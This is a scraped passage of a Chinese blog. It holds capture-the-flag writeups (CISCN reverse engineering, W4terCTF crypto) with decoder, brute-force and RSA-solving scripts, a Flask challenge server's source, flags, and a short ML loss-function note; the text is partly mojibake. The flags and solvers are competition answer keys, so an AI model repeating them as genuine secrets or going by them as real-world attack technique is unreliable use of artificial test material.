e,8b,de,45,35,32,13,1,34,28,19,2,23,15,24,29,3,18,25,9,12,30,6,26,20,21,22,0,17,10,7,33,5,16,31,36,27,11,14,8,4,37,65,d9,47,f1,58,b3,9b,60,d3,3c,19,4c,e3,88,3a,1b,d2,a7,e1,5a,62,16,6d,fb,91,35,fc,7c,f6,9c,e3,5c,75,2a,4d,cd,dd,e8,-------------60000000------------d9,f,18,bd,c7,16,81,be,f8,4a,65,f2,5d,ab,2b,33,d4,a5,67,98,9f,7e,2b,5d,c2,af,8e,3a,4c,a5,75,25,b4,8d,e3,7b,a3,64,18,14,27,30,17,5,7,1,16,34,6,23,22,8,25,19,4,15,2,13,37,12,3,21,28,20,11,26,24,9,29,35,31,32,36,10,0,33,de,aa,42,fc,9,e8,b2,6,d,93,61,f4,24,49,15,1,d7,ab,4,18,cf,e9,d5,96,33,ca,f9,2a,5e,ea,2d,3c,94,6f,38,9d,58,ea,-------------70000000------------c8,f2,53,8a,52,41,5a,ee,f2,f1,f2,7a,a3,17,9c,87,38,63,69,2a,36,1f,e8,e5,1e,e8,ce,47,6d,d2,10,35,c4,63,bf,17,a5,19,14,21,11,18,29,22,9,5,7,2,24,30,10,20,31,32,28,27,17,34,33,0,25,26,3,4,13,8,23,1,16,15,12,36,6,35,19,37,b4,90,ab,fc,a0,49,6e,e7,6,c8,13,e1,b,d,3,ba,da,36,9f,6b,cc,42,13,7,ff,c0,d9,c7,66,bc,3d,1a,4c,e8,16,ec,31,84,-------------80000000------------5d,e0,20,ff,f6,50,2a,7,91,29,51,d5,b7,c4,95,7a,8f,fb,f7,95,d8,f3,aa,c7,69,78,4b,f2,82,4a,22,df,2b,42,de,21,93,8,7,27,36,10,15,13,18,24,14,23,26,6,29,21,3,37,34,1,35,5,28,16,4,22,9,12,25,2,32,17,8,30,11,20,31,33,19,0,eb,4e,4a,b9,d8,a5,1b,3b,f3,28,65,aa,ad,da,53,b4,9a,1f,9a,85,2d,5e,91,ce,2a,c5,93,28,73,53,f,5e,a1,5a,17,7a,ff,33,-------------90000000------------db,a1,1d,ca,e2,6b,d6,f8,87,4,87,1a,85,d3,34,2d,36,10,cb,5c,de,5e,6b,61,3e,cf,b5,68,65,1f,f,40,c0,2d,a,a2,98,e1,9,20,8,6,34,11,13,29,5,37,23,7,24,15,17,16,2,31,36,19,10,14,35,27,32,0,25,26,21,3,12,22,18,4,30,33,28,1,a8,4,39,d4,82,9b,5c,df,5b,50,9d,59,13,10,c0,3b,a3,36,a3,f5,d9,15,ea,14,69,7a,70,a1,2d,5,44,d5,9,7d,aa,8c,19,6,-------------a0000000------------c9,84,58,97,6e,97,b0,29,81,ab,14,a2,ca,3f,a5,80,9a,ce,cc,ee,75,fe,28,e9,9a,8,f5,76,86,4c,aa,4f,d0,3,e6,3e,9a,96,14,4,35,13,28,9,29,7,18,2,8,15,17,31,6,21,11,23,33,32,19,34,37,16,24,10,26,20,12,3,30,27,0,36,1,22,25,5,7f,e9,a2,d4,1a,fc,18,c0,54,85,4f,46,f9,d4,ae,f4,a6,c0,3e,48,d6,6e,28,85,35,70,50,3e,34,d7,54,b3,c1,f6,88,db,f2,a0,-------------b0000000------------a4,2e,a1,75,e8,1d,5a,bc,ef,ca,37,5d,1c,3e,36,50,87,2d,a8,67,8b,c8,5d,95,3,b1,cd,3b,41,17,a1,e6,46,42,5b,2e,5f,b5,23,37,8,16,29,7,13,14,25,4,31,22,17,28,27,32,19,11,35,18,9,15,10,12,36,21,33,30,2,26,24,0,5,20,34,3,6,1,f7,bb,9d,df,cb,31,2f,66,8e,dc,97,ee,3a,95,89,da,ab,c5,60,6,43,41,90,20,d7,5,4d,ed,9c,25,9e,94,e0,3c,73,ab,6d,a2,-------------c0000000------------cf,4c,89,22,13,9c,f8,aa,4d,45,4,e0,c8,38,2d,b9,f0,dc,48,e8,2e,80,64,d4,26,65,90,5c,67,b3,83,37,ff,d,59,12,a9,51,5,22,0,9,10,26,27,4,31,8,14,35,24,2,3,20,29,18,6,37,17,7,19,15,32,16,28,1,30,11,23,25,33,13,36,34,12,21,b0,6f,ef,9a,50,4e,6c,5f,2d,a3,42,33,3e,b6,95,41,dc,7a,7b,2,6d,e,3a,9,f2,2f,9c,6c,e5,6,44,95,75,33,2f,c5,81,9c,-------------d0000000------------c3,da,40,9e,23,2,77,aa,fc,6d,3c,4c,b1,cc,e5,f7,51,10,cf,b6,c,e1,c9,e4,ec,b8,ad,d3,20,c5,8,e3,9f,48,82,c2,4b,f9,34,14,1,30,25,29,0,23,20,37,36,4,19,8,22,24,5,9,6,2,13,7,11,28,33,3,17,32,16,18,15,21,31,12,10,27,35,26,d7,70,d,9e,f9,ec,1b,8f,ac,61,8,58,5f,2f,d7,7e,1b,5f,80,a6,2f,4,f3,4a,81,ad,ac,66,f,a3,63,e7,13,70,85,c,5c,a0,-------------e0000000------------25,31,f3,c6,f3,82,4,bb,d3,99,6f,a5,7d,81,dd,2e,92,7d,f0,d0,1c,3c,99,2,73,24,8d,ca,c3,82,e4,e8,b3,d7,ae,a7,5a,b2,4,14,31,15,18,2,24,17,22,26,33,21,5,36,0,23,1,35,32,3,30,9,12,25,8,11,34,13,7,10,29,19,16,37,28,27,6,20,3d,26,88,22,53,6f,d7,9c,93,26,e8,29,99,c1,8a,cf,1c,d0,ed,2a,ed,b9,e0,64,37,f8,8,1,e2,7e,93,1f,a4,1b,41,f7,8b,18,-------------f0000000------------41,18,29,ae,6a,d2,d3,d8,30,39,fa,70,f2,c5,f3,95,5d,23,62,82,a7,49,ba,c3,23,82,2a,bb,c3,3d,13,4,55,3c,b2,c0,f,86,2,27,32,7,20,21,22,30,8,6,13,11,14,0,34,9,15,5,24,28,1,31,16,25,18,36,12,10,37,26,29,23,3,17,35,19,33,4,30,bf,2a,e5,86,d3,1c,f4,c4,e,25,d9,82,81,a8,b9,1a,8b,f5,8,aa,e4,b7,d8,58,fd,45,8c,d6,61,70,7,21,9b,ec,a7,6e,9,*/ 1234567891011121314151617181920212223242526272829303132333435363738394041424344a=&#x27;congratulationstoyoucongratulationstoy&#x27;b=[191, 215, 46, 218, 238, 168, 26, 16, 131, 115, 172, 241, 6, 190, 173, 136, 4, 215, 18, 254, 181, 226, 97, 183, 61, 7, 74, 232, 150, 162, 157, 77, 188, 129, 140, 233, 136, 120]c=[]d=[]shu1=[]shu2=[]shu3=[]for i in range(38): c.append(ord(a[i])^b[i])f=open(r&quot;D:\\desktop\\编程\\ctf\\CISCN\\RE\\gdb_debug\\2.txt&quot;).readlines()for i in range(0,64,4): d=[0 for k in range(38)] m=[0 for k in range(38)] shu1=f[i+1].strip().split(&quot;,&quot;) shu2 = f[i + 2].strip().split(&quot;,&quot;) shu3 = f[i + 3].strip().split(&quot;,&quot;) for j in range(38): m[j] = c[j] ^ int(shu3[j],16) for k in range(38): #d.append(c[shu2.shu2(chr(k+48))]) d[int(shu2[k])]=m[k] for l in range(38): d[l] = d[l] ^ int(shu1[l],16) for cs in d: print(chr(cs),end=&#x27;&#x27;) print()#[9¶4À_§Gü9 µv Û,¸Vîµ[&lt;ºZQÓsÄj¾à&#125;p@êoûóiV&#125;&#123;(­5ñùh¸]ô+oÝÉ5áÛX:°&amp;±·¢ùø ê0VäO£Àål&lt;ã7½ò7ïéd¹0èÆÉq&gt;Ù;­aßís¢ EFÅ6Öñ¨êwXèdmLÍÖh|y7­m&gt;4XêëÃÐô^8ÃÕ(ÕUvKèÚÌò²«(J¸Ôê=/âgÓêw_¯ª2¦¬flag&#123;78bace5989660ee38f1fd980a4b4fbcd&#125;:ôÃ³¨ñ&lt;ðô¹ì(üë7hyÕôßÜîièy_f¢oQrh^0wLU§¨&gt;\\kmù´ý7ÕöyX7¢¥/Æ@Ç¦Õpß¿9þpH(á¬íñ&quot;b$D¬¥ZØæ&lt;GF£ÛóÏ?6ÀoV^Ï^wîÖönàá :K@Ü±ÇC&amp;.ÐD2_¨6ì5å~%§X«+¾tÐ+l@Ñ©`1×3Ç¶`½ïi)ðþ)übÈ%®ä·`¹gÝ³yqÔ^ÅõB«¹yØ¶mUãr#F°.5-&#125;¤¯O&quot;ÀnÝBºà+#dyqFUgrh£«­Ò;C±å?ëå1Ê¹ &#125;øß #çÙKFdÅ\\b÷Ï|ë18äåWu¸½SÈà«¼@¤m?µÄÓª whereThel1b123456789101112131415161718192021222324252627282930313233343536373839404142import whereThel1bimport itertools# 初始flag结构flag_template = &#x27;a&#x27;*42# 目标加密值target_encryption = [108, 117, 72, 80, 64, 49, 99, 19, 69, 115, 94, 93, 94, 115, 71, 95, 84, 89, 56, 101, 70, 2, 84, 75, 127, 68, 103, 85, 105, 113, 80, 103, 95, 67, 81, 7, 113, 70, 47, 73, 92, 124, 93, 120, 104, 108, 106, 17, 80, 102, 101, 75, 93, 68, 121, 26]# 字符集charset = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-@_&#123;&#125;&#x27;# 分段破解，每次破解三个字符for i in range(0, 41, 3): # 从第个字符开始 found = False for combo in itertools.product(charset, repeat=3): # 替换当前部分 test_flag_list = list(flag_template) test_flag_list[i:i + 3] = combo test_flag = &#x27;&#x27;.join(test_flag_list) test_flag_bytes = test_flag.encode() # 加密并获取结果 whereThel1b.whereistheflag(test_flag_bytes) result = whereThel1b.trytry(test_flag_bytes) # 比较当前三字符对应的四个加密值是否匹配 if result[int((i+3)/3-1)*4:(int((i+3)/3-1)*4)+4] == target_encryption[int((i+3)/3-1)*4:(int((i+3)/3-1)*4)+4]: found = True flag_template = test_flag # 更新flag模板 print(f&quot;Match found for position &#123;i&#125;-&#123;i + 2&#125;: &#123;&#x27;&#x27;.join(combo)&#125;&quot;) break if not found: print(f&quot;No matching flag part found for position &#123;i&#125;-&#123;i + 2&#125;.&quot;) break# 输出最终flagprint(&quot;Final flag:&quot;, flag_template)#Final flag: flag&#123;7f9a2d3c-07de-11ef-be5e-cf1e88674c0b&#125;","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://d3v3nlxk.github.io/tags/writeup/"}]},{"title":"第二章 神经网络的学习","slug":"第二章 神经网络的学习","date":"2024-05-08T07:25:52.000Z","updated":"2024-07-09T12:10:03.265Z","comments":true,"path":"2024/05/08/第二章 神经网络的学习/","permalink":"https://d3v3nlxk.github.io/2024/05/08/%E7%AC%AC%E4%BA%8C%E7%AB%A0%20%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"数据处理机器学习中一般将数据分为训练数据和测试数据（也称监督数据）来进行学习和实验，顾名思义就是提取特征参数以及验证准确率（正确的评价模型，称为泛化能力），特别的，对于某一个数据集进行过度拟合称之为过拟合，而关键就在于如何对这些数据进行处理从而能够划分绝大部分未知数据。 损失函数查找最优权重参数的就是损失函数，它能够用来判断一个神经网络功能的准确性。 均方方差 E=\\frac{1}{2}\\sum_{k}{(y_k-t_k)}^2$k$表示数据维度，$y_k$表示输出数据，$t_k$表示监督数据。 代码表示： 12def mean_squarred_error(y,t): return np.sum((y-t)**2)/2 交叉熵误差 E=-\\sum_k t_k\\log{y_k}$y_k$表示输出数据，$t_k$表示正确解标签。正确解标签用$one-hot$​表示（即正确的为1，其余的都为0）。 123def cross_entropy_error(y,t): delta = 1e-7 return -np.sum(t*np.log(y+delta))#保护性政策防止log负无限大 mini-batch学习 E=-\\frac{1}{N}\\sum_n\\sum_k t_{nk}\\log{y_{nk}}从训练数据中随机抽取$N$个数据进行学习，平均化后获得与数量无关的统一标准。","categories":[],"tags":[{"name":"AI","slug":"AI","permalink":"https://d3v3nlxk.github.io/tags/AI/"}]},{"title":"W4terCTF 2024 Writeup（25题）                                             ——GZTime的🐕","slug":"W4terCTF Writeup","date":"2024-04-28T16:00:00.000Z","updated":"2024-05-19T12:49:22.469Z","comments":true,"path":"2024/04/29/W4terCTF Writeup/","permalink":"https://d3v3nlxk.github.io/2024/04/29/W4terCTF%20Writeup/","excerpt":"","text":"第一次参加校赛，reverse和pwn都是我做的（可惜时间不够，否则我都想re ak的），感觉这成绩还是不错的（两位队友带我起飞），本来是第二的，但有两支队不讲武德，藏flag最后四小时狠狠上分。之前没有什么逆向经验，这次比赛下来还是收获颇丰的，虽然做题做的有点慢，但是真切地能够感受到推理、查资料、求解的那种乐趣。Yring和Lilran两位师傅出的题目都很有含金量，能够学到蛮多东西的。下面的是我们队这次的wp。题外话：我们的队名GZTime的🐕是我起的，主要是我看到去年的队伍有叫做GZTime Fans的，就想取个比较搞的名字。 Crypto(4题）Merciful ZMJ4396多项式环上的扩展欧几里得算法得大因子 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from sage.all import *from gmpy2 import *ndef HGCD(a, b): if 2 * b.degree() &lt;= a.degree() or a.degree() == 1: return 1, 0, 0, 1 m = a.degree() // 2 a_top, a_bot = a.quo_rem(x**m) b_top, b_bot = b.quo_rem(x**m) R00, R01, R10, R11 = HGCD(a_top, b_top) c = R00 * a + R01 * b d = R10 * a + R11 * b q, e = c.quo_rem(d) d_top, d_bot = d.quo_rem(x**(m // 2)) e_top, e_bot = e.quo_rem(x**(m // 2)) S00, S01, S10, S11 = HGCD(d_top, e_top) RET00 = S01 * R00 + (S00 - q * S01) * R10 RET01 = S01 * R01 + (S00 - q * S01) * R11 RET10 = S11 * R00 + (S10 - q * S11) * R10 RET11 = S11 * R01 + (S10 - q * S11) * R11 return RET00, RET01, RET10, RET11 def GCD(a, b): print(a.degree(), b.degree()) q, r = a.quo_rem(b) if r == 0: return b R00, R01, R10, R11 = HGCD(a, b) c = R00 * a + R01 * b d = R10 * a + R11 * b if d == 0: return c.monic() q, r = c.quo_rem(d) if r == 0: return d return GCD(d, r)def gcd1(a, b): if b == 0: return a.monic() else: return gcd1(b, a % b)PR=PolynomialRing(ZZ,&#x27;x&#x27;)x=PR.gen()f=x**43+96g=(x-7)**77+(x+777)**7a=xgcd(f,g)b=int(a[0])b=b//(2**10)P=PolynomialRing(Zmod(b),&#x27;m&#x27;)m=P.gen()f=m**43+96g=(m-7)**77+(m+777)**7c=gcd1(f,g)#print(c)m=var(&#x27;m&#x27;)hm + 38089684625165355515624354323301527857939552697354804516819422353275812038211620368158964415270548726559984698682160433000637639222831556990086888486825903198602024362861879262211932095270907872113482311038918176588913386518192194876297961009867928846093830685899219439389800740993792802316498099414290018457742434909363860984833045354751995694644703399898729687815646871370319484443236384813431388355872766558292416351268806865697189983627607880043859887343625474691331152127193897818520038233835196855998398104101627544317521380648459078461855739574188231475543711323514294926093665195944810376066585777225873232350603277259426498670396729320619499863216842853679145737660220385839865744256105759211247983020972708950763321499427882542770936364941812713236353283124680802134554909307889169709896389811377628499435655090294963946066166821966378079506185390431699899548676808283606604151619567852965151925051164626057214131670463295384497201297146007655675404039225892942309938527498342134626741193446165681930380030822705574097383167026791705306850968073707438708474876588883907927667646650004150971129869828800646004929362964317192761391717249175969345092829246826640485728313831310305658496320545740961417114235582608474306187728527532026526287298890881519909161830883432811525910117514263094816630647344617367361584272167075112490928079788673652526186319116798829557185125824428448892945645308261785097832566353214442697004167946967306481742059423957081102477621398468851218178591048540563001204554512675554930177571908143521393422990908446896517784659774006437411096373975182940867970143802202981679934496122412674501387212932620957215858078629899223570210306634836989376896621311505808424605325974847661348735601289000907248341364193938693674516323292485949661558304638076521603077575871571159984966898303817127753769159107121824706173004180246663974997373509692942470532305374992438838494229256023511802741049544766425451602342915214599790489569342362590693418510942070019526355401696070369429206361066403610530758980535063244868276638273770248630755734742727600771872400243958786473401684832028246671014909602292844320914119883334396265238083388921149868817074494397735142384513640594014859977860714543454429372235910678394546037396423465011442193908506121639295737297799146224602388638866417847257655894201616263153056634951630455182302726340340726415959840442890925880139534919744225420037233196392739358550336879491160521277366939475211765907264585255918372962716813539983527963851530458227522179999871218778487803642874785880058462908706258210953375989393750306462125499392248609336892807344079552339980729947811473224723328827245287834720652040111322348599786708311166753975030667294688618671611407440374142321517981525456911166436824259567461694201885182436632028010575402934189#print(h)eq=h==0s=solve(eq,m)mmmm=int(mm)mm=int(a[0])-mmprint(mm)g = gmpy2.gcd(mm** 43 + 96, (mm - 7) ** 77 + (mm + 777) ** 7)print(g.bit_length())m=b&quotquot;m=gmpy2.mpz(m)#print(m)g = gmpy2.gcd(m** 43 + 96, (m - 7) ** 77 + (m + 777) ** 7)#print(g.bit_length()) (HGCD没用) n77接收部分 1234567891011121314151617181920212223242526272829303132333435from pwn import *from tqdm import *from Crypto.Util.number import *p=remote(&#x27;localhost&#x27;,57783)cipher=[]a=[]&#x27;&#x27;&#x27;&#x27;for i in tqdm(range(2**21)): a.append(str(i)) a.append(&#x27;,&#x27;)a=&#x27;&#x27;.join(a)[:-1]#a=a.encode(&#x27;utf-8&#x27;)p.sendlineafter(b&quot;The frequencies you want to run by n77:&quot;,a)cipher=p.recvline()f=open(&#x27;cipher2.txt&#x27;,&#x27;w&#x27;)f.write(cipher.decode())&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;for i in tqdm(range(2**21)): p.send(b&#x27;i&#x27;) p.send(b&#x27;,&#x27;)&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;cipher=[]for i in tqdm(range(0,2**21)): p.sendlineafter(b&quot;The frequencies you want to run by n77:&quot;,str(i).encode()) b=p.recvline() cipher+=bprint(len(cipher))&#x27;&#x27;&#x27;p.interactive() 多项式插值 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152from Crypto.Util.number import *from sage.all import *import collectionsclass tree(object): def __init__(self, data, left=None, right=None): self.data = data self.left = left self.right = right def printAllLine(self): q = collections.deque() # 先进先出队列 q.append(self) line = 0 pre = 1 nxt = 0 while pre: for i in range(pre): node = q.pop() if node.left != None: q.append(node.left) q.append(node.right) nxt += 2 print(f&quot;Node &#123;line&#125;-&#123;i&#125; = &#123;node.data&#125;&quot;) pre = nxt nxt = 0 line += 1 print() def printAllNode(self): q = collections.deque() # 先进先出队列 q.append(self) line = 0 pre = 1 nxt = 0 while pre: for i in range(pre): node = q.pop() if node.left != None: q.append(node.left) q.append(node.right) nxt += 2 print(f&quot;Node &#123;line&#125;-&#123;i&#125; = &#123;node.data&#125;&quot;) pre = nxt nxt = 0 line += 1 print() def printAllNode(self): q = collections.deque() # 先进先出队列 q.append(self) cnt = 0 while len(q): node = q.pop() if node.left: q.append(node.left) if node.right: q.append(node.right) print(f&quot;Node &#123;cnt&#125; = &#123;node.data&#125;&quot;) cnt += 1def getMulTree(ls, l, r): # ls 为以 x-i 为叶节点构成的乘积树 if l == r: return tree(ls[l]) else: mid = (l + r) // 2 ltree = getMulTree(ls, l, mid) rtree = getMulTree(ls, mid + 1, r) tr = tree(ltree.data * rtree.data, ltree, rtree) return trdef getMul(ls, l, r): # ls 为以 x-i 为叶节点构成的乘积树 if l == r: return ls[l] else: mid = (l + r) // 2 ld = getMul(ls, l, mid) rd = getMul(ls, mid + 1, r) return ld * rddef poly_eval(pol, lx): # lx 为因变量列表, 元素类型为 int def dfs(node, res): if node.left: (node.left).data = node.data % (node.left).data (node.right).data = node.data % (node.right).data dfs(node.left, res) dfs(node.right, res) else: res.append(node.data(lx[len(res)])) # 构建乘积树; pol 是关于 x 的多项式环 print(f&quot;[+] get multiple tree&quot;) polx = [x - i for i in lx] tr = getMulTree(polx, 0, len(polx) - 1) tr.data = pol % tr.data res = [] dfs(tr, res) return resdef mergeMul(v, polx, l, r): if l == r: return v[l], polx[l] else: mid = (l + r) // 2 f0, M0 = mergeMul(v, polx, l, mid) f1, M1 = mergeMul(v, polx, mid + 1, r) f = f0 * M1 + f1 * M0 M = M1 * M0 return f, M# sagefrom time import *import refrom tqdm import tqdmg=71767377331695608779546p = 151115727451828881719297s2n=lambda x: [int(x) for x in re.findall(r&quot;\\-?\\d+\\.?\\d*&quot;,x)]f=open(&#x27;cipher2.txt&#x27;,&#x27;r&#x27;).readlines()a=[s2n(f[0])][0]lx = []ly = afor i in tqdm(range(2**21)): lx.append(pow(g,i,p))Zp = Zmod(p)P= PolynomialRing(Zp,&#x27;x&#x27;)x=P.gen()# 得到 M(x)print(f&#x27;[+] geting M(x)&#x27;)st = time()polx = [x - i for i in lx]Mtree = getMulTree(polx, 0, len(polx)-1)M = Mtree.dataprint(f&#x27;- cost &#123;time() - st&#125; s\\n&#x27;)# 得到所有 M&#x27;(xi), vicoff = M.list()M_ = P([i*coff[i] for i in range(len(coff))][1:])st = time()print(f&#x27;[+] geting M\\&#x27;(xi) and vi&#x27;)Mxi = poly_eval(M_, lx)v = [ly[i]/Mxi[i] for i in range(len(ly))]print(f&#x27;- cost &#123;time() - st&#125; s&#x27;)# 计算 f(x)print(f&#x27;[+] calculate f(x)&#x27;)f = mergeMul(v, polx, 0, len(v)-1)[0]fs = [i for i in f]print(len(fs))t=open(&#x27;key.txt&#x27;,&#x27;w&#x27;)t.write(str(fs)) sha256得key 12345678910111213141516from sage.all import *from tqdm import tqdmimport reimport hashlibs2n=lambda x: [int(x) for x in re.findall(r&quot;\\-?\\d+\\.?\\d*&quot;,x)]f=open(&#x27;key.txt&#x27;,&#x27;r&#x27;).readlines()a=[s2n(f[0])][0]key=hashlib.sha256(str(a).encode()).hexdigest()print(key)&#x27;&#x27;&#x27;&#x27;p = 151115727451828881719297g = 35700516409543816395312for i in tqdm(range(2**21)): a=discrete_log((g,p),(i,p)) print(a)&#x27;&#x27;&#x27; Smoke hints1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from sage.all import *from Crypto.Util.number import *from functools import *from tqdm import tqdmdef solve_pell(N, numTry = 10000): cf = continued_fraction(sqrt(N)) for i in range(numTry): denom = cf.denominator(i) numer = cf.numerator(i) if numer**2 - N * denom**2 == 1: return numer, denom return None, None#114514 * x**2 - 11680542514 * y**2 + 1919810 == 2034324N=102001(x,y)=(34834945635419823491817566563399234823053176449889821571800075702352062905044231520196782430564993617886316750841220280683153456634693274516582390418863033711415731372881163288179660369032440262647344962570809308551786423557604581792293023628226671539671001863522824415876161727357840363896909435994314597682318687286109212360132261705780761350223208855493439905713509683216585447535669179103840355151676900348955850726834778558748576176596609474037298456423607570516459873639794526160082489103786303332253388597560031538949333472681857144605196440020688999368156212067614295618998719682195870452330682061061500341728481458877113934526003865064359452801, 109071911012732502022850422978096246932142152916423367258339958080776017127779842287569032054094868715662547617710798972237860865468979518796870762466053422806566269221859683504667443154145089120448705028998733329483536176859312788275313407342047772524898407149610870586148015013605624329594138230714119704939505401061380777712216157719510271261619101362035144616187262082302740411574934586360516695062056563100258177611076242927354475633328163841594305884855770651187471060662561145818768319723133613889115397679168254599526858767478331211008997427364431641348477558436549415894985022330773540762573918592860707967250624976183104841257499345937186160)n = 111142605318735316938813250649386186738165574403166232438033419260313952061815533207450871033232370985494268430314169448475438919785759287325853679865987475649861268995000160238867304069959254282061698925178491591193176755600625548815856471200884990208347240605158091477804516311358239578204447428316924883139c = 14794355763668026059581009059845450392816207668012833094446886308987889821543883267746971922741865673487443815274834235738698431633774882304159537446114650022150426297027544254380786486074802859284301567380813184684791456632406347433975754616113078644646837490359219629155589268592341562798209651528987190793hint3 = 83343262248050723243690057406554348365200620864419919736886034956863826795653hint1 =160093hint2 = 95072hint4 = 31137501778858299615600055644332884098426295128650804609776490088248016329371hint5 = 11710750842274585251210766417005897881799695998068747448625459451330648772621232917176022405239262469049329400090359131642311486007738210824174523675053996880787222864294785408395020722385178586733441514721301288397604765287982020108111347733095127671430898213610826672319419397413476661196462370862076814075847680675717773517253576852340346633076316788249025474640669998699872949858429517311372992134571296738328332814308593411839340876004375352647922649680384003461364822769943147497240342425056158793463424433450020417900765022892768508202691229814978790903912340504760860195811778413019475303727383949464271242615491613035966729204944614688540997298000220190786199853203074434002240880245157386787354490451076912801995143695080697782529986921930050383188443698246144352701984882396959104464992678434442165508095875068152602744649259855450968610753257266594251544846496664257012942329948807492304124971743908687979339125103933539325405859428196150130637506771429050194262073725068990704713754560018294868550194735619985781364649130639452951276407458945356639530140611175015907001449470657099624326115832803895711695522244630465698969924219734702526323353339331488231038449632558640062360926014709675603808427063294477586755020386497395053690836558120719640836146770669502040742770697480400876175974623256067733443979145385016639861677740604404191709619615846456136958727729966605312191266834062164557522847398465771465817679529193047744057010322257402930079&#x27;&#x27;&#x27;&#x27;p,q=var(&#x27;p,q&#x27;)eq1=x**2*p+y**2*q==hint5eq2=p*q==na=solve([eq1,eq2],p,q)print(a)&#x27;&#x27;&#x27;p=9650490459555335333244059307069670229189533174325439128394841124375310110217984805348235781353957896407801704373996441978648002759368642084791814763698079q=11516783088333981260978080269650124779997259618293789210569143886195817909393039590867784365726080854266468852769392016198480826680860193135341745674626141es=[]for i in tqdm(range(200000,400000)): e=i*hint1+hint2 print(e.bit_length()) if isPrime(e) and e.bit_length()==36: d=inverse(e,(p-1)*(q-1)) m=long_to_bytes(pow(c,d,n)) if b&#x27;W4terCTF&#123;&#x27; in m: print(m) break print(len(es))&#x27;&#x27;&#x27;PR=PolynomialRing(Zmod(n),&#x27;x&#x27;)x=PR.gen()f=hint3*2**256+x#f=f.monic()roots=f.small_roots(X=2**256,beta=0.4)[0]print(roots)&#x27;&#x27;&#x27;#W4terCTF&#123;wA7ch_0uT_TH3_Sm0KE_hlNts_1ROM_WllSoN&#125; Wish123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132from flask import Flask, request, jsonify, send_from_directoryimport randomimport stringimport osimport timeimport requestsfrom functools import wrapsfrom hashlib import sha256from Crypto.Cipher import AESfrom Crypto.Util.Padding import padapp = Flask(__name__, static_folder=&#x27;static&#x27;)app.logger.setLevel(&#x27;INFO&#x27;)counter_url = &#x27;不告诉你&#x27;FLAG = os.getenv(&#x27;GZCTF_FLAG&#x27;, &#x27;flag&#123;genshin_impact&#125;&#x27;)class TokenBucket: def __init__(self, capacity, fill_rate): self.capacity = capacity self._tokens = capacity self.fill_rate = fill_rate self.timestamp = time.time() def consume(self, tokens=1): now = time.time() self._tokens += (now - self.timestamp) * self.fill_rate self._tokens = min(self.capacity, self._tokens) self.timestamp = now if self._tokens &gt;= tokens: self._tokens -= tokens return True return Falsedef rate_limit(bucket): def decorator(f): @wraps(f) def decorated_function(*args, **kwargs): if not bucket.consume(): return jsonify(&#123;&#x27;message&#x27;: &#x27;Rate limit exceeded!&#x27;&#125;), 429 return f(*args, **kwargs) return decorated_function return decoratordef generate_wish(time, index): random.seed(time) probability = 0 for _ in range(index): diff = min(abs(random.randint(0, 1919810) - 114514), 10000) probability = 100 * (0.1) ** diff app.logger.info( f&#x27;probability: &#123;probability&#125;, time: &#123;time&#125;, index: &#123;index&#125;&#x27;) if int.from_bytes(os.urandom(1), &#x27;little&#x27;) % 100 + 1 &lt;= probability: return &quot;flag&quot; else: characters = string.ascii_letters + string.digits return &#x27;&#x27;.join(random.choice(characters) for _ in range(4))wish_chances = 0bucket = TokenBucket(30, 1)@app.route(&#x27;/get_wish_chances&#x27;, methods=[&#x27;GET&#x27;])@rate_limit(bucket)def get_wish_chances(): global wish_chances return jsonify(&#123;&#x27;wish_chances&#x27;: wish_chances&#125;)@app.route(&#x27;/wish&#x27;, methods=[&#x27;POST&#x27;])@rate_limit(bucket)def handle_wish(): global wish_chances if wish_chances &lt;= 0: return jsonify(&#123;&#x27;message&#x27;: &#x27;No more wishes available!&#x27;&#125;) data = request.get_json() time = data.get(&#x27;time&#x27;, 0) index = data.get(&#x27;index&#x27;, 0) if not 0 &lt;= time &lt; 24*60*60 or not 0 &lt;= index &lt; 10: return jsonify(&#123;&#x27;message&#x27;: &#x27;Invalid input!&#x27;&#125;) result = generate_wish(time, index) wish_chances -= 1 if result == &#x27;flag&#x27;: return jsonify(&#123;&#x27;results&#x27;: result, &#x27;flag&#x27;: FLAG&#125;) else: return jsonify(&#123;&#x27;results&#x27;: result&#125;)def keycalculator(m): sha = sha256(m.encode()).hexdigest() key = b&quot;????&quot; iv = b&quot;????&quot; cipher = AES.new(key, AES.MODE_CBC, iv) ciphertext = cipher.encrypt(pad(sha.encode(), AES.block_size)) return ciphertext@app.route(&#x27;/query_reset&#x27;, methods=[&#x27;GET&#x27;])@rate_limit(bucket)def query_reset(): global wish_chances headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/octet-stream&#x27;&#125; flaghash = keycalculator(FLAG) response = requests.post(counter_url+&#x27;/query&#x27;, data=flaghash, headers=headers) app.logger.info(f&#x27;query_reset: &#123;response.text&#125;&#x27;) if response.text != &#x27;0&#x27;: response = requests.post( counter_url+&#x27;/decrement&#x27;, data=flaghash, headers=headers) app.logger.info(f&#x27;decrement: &#123;response.text&#125;&#x27;) remaining = int(response.text) if remaining &gt;= 0: wish_chances = 3 return jsonify(&#123;&#x27;message&#x27;: &#x27;Wish chances reset successful!&#x27;&#125;) else: return jsonify(&#123;&#x27;message&#x27;: &#x27;Wish chances reset failed!&#x27;&#125;) return jsonify(&#123;&#x27;message&#x27;: &#x27;No chance to reset!&#x27;&#125;)@app.route(&#x27;/get_reset_chances&#x27;, methods=[&#x27;GET&#x27;])@rate_limit(bucket)def get_reset_chances(): headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/octet-stream&#x27;&#125; flaghash = keycalculator(FLAG) response = requests.post(counter_url+&#x27;/query&#x27;, data=flaghash, headers=headers) app.logger.info(f&#x27;query_reset: &#123;response.text&#125;&#x27;) reset_chances = int(response.text) return 